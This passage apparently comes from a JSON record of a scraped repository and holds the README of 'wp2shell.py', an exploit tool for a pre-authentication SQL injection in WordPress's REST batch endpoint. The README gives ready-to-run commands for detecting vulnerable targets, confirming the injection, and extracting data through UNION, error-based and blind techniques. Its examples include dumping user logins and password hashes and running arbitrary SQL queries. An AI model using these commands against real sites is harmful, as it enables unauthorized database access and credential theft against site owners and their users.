http://victim.com\n```\n\n### Check Mode (default)\n\nPerforms a single vulnerability check. Sends a benign batch marker probe that detects the route confusion bug without executing SQLi payloads. A vulnerable target returns HTTP 207 with the error pattern `parse_path_failed`, `block_cannot_read`, and `rest_batch_not_allowed`.\n\nUse `--confirm-sqli` to also send an active SQLi confirmation payload. The confirmation tries UNION reflection first, then falls back to timing-based probes.\n\n **Check single target (default mode)**\n \n```bash\nwp2shell.py http://target.com\n```\n\n**Check with explicit mode**\n\n```bash\nCheck with explicit mode\nwp2shell.py http://target.com --check\n```\n\n**Check with SQLi confirmation**\n\n```bash\nwp2shell.py http://target.com --check --confirm-sqli\n```\n\n\n### Read Mode - Extract Data Through SQL Injection\n\nExtracts data from the database using the pre-authentication SQL injection. By default uses `--technique auto`, which tries available methods in this order:\n\n- **union** - forges a fake `WP_Post` row via UNION and reads its title back from the REST response as `||HEX(value)||`. One request per value. Fastest.\n- **error** - uses `EXTRACTVALUE`/`UPDATEXML` to leak ~15 bytes per request. Works when the target reflects MySQL errors (e.g., `WP_DEBUG_DISPLAY` on).\n- **blind** - boolean binary search, ~8 requests per character. Reads the `X-WP-Total` header as the true/false signal. Works even when no data is reflected.\n\nForce a specific technique with `--technique union|error|blind`. These read paths are read-only and do not write to the database.\n\n\n**Server fingerprint (default query)**\n\n```bash\nwp2shell.py http://target.com --read\n```\n\n**Dump logins and password hashes**\n\n```bash\nwp2shell.py http://target.com --read --preset users\n```\n\n**Custom SQL query**\n\n```bash\nwp2shell.py http://target.com --read --query \"SELECT @@version\"\n```\n\n**Force blind technique**\n\n```bash\nwp2shell.py http://target.com --read --technique blind --query \"SELECT user_login FROM wp_users LIMIT 1\"\n```\n\n**Extract with error-based technique**\n\n```bash\nwp2shell.py http:",
+      "default_branch": "main"
+    },
+    "fetched_at": "2026-08-23T02:19:39.131861"
+  }
+]
